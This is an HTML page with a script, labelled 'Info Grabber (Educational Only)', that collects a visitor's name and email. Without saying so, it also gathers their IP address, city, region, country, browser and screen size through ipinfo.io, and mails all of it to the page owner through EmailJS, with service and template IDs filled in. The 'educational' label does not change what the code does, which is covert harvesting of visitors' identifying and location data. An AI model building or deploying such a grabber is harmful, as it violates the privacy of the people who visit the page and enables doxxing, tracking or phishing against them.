<!DOCTYPE html>
<html>
<head>
  <title>EmailJS Info Sender with Inputs</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>

<h2>Info Grabber (Educational Only)</h2>

<label>Full Name:</label>
<input type="text" id="fullname"><br><br>

<label>Email:</label>
<input type="email" id="useremail"><br><br>

<button onclick="sendInfo()">Send Info</button>

<script>
  // Init EmailJS
  (function() {
    emailjs.init("YOUR_USER_ID_HERE"); // <<-- Replace this
  })();

  // Get IP info
  async function getIpInfo() {
    const res = await fetch("https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN"); // Optional token
    return await res.json();
  }

  async function sendInfo() {
    const ipData = await getIpInfo();

    const name = document.getElementById("fullname").value;
    const email = document.getElementById("useremail").value;

    const data = {
      fullname: name,
      useremail: email,
      browser: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      ip: ipData.ip,
      city: ipData.city,
      region: ipData.region,
      country: ipData.country,
    };

    emailjs.send("service_eld8eqy", "template_31sd9v5", data)
    .then(res => {
      console.log("Sent!", res.status);
      alert("Info sent successfully.");
    })
    .catch(err => {
      console.error("Error sending:", err);
      alert("Failed to send info.");
    });
  }
</script>

</body>
</html>
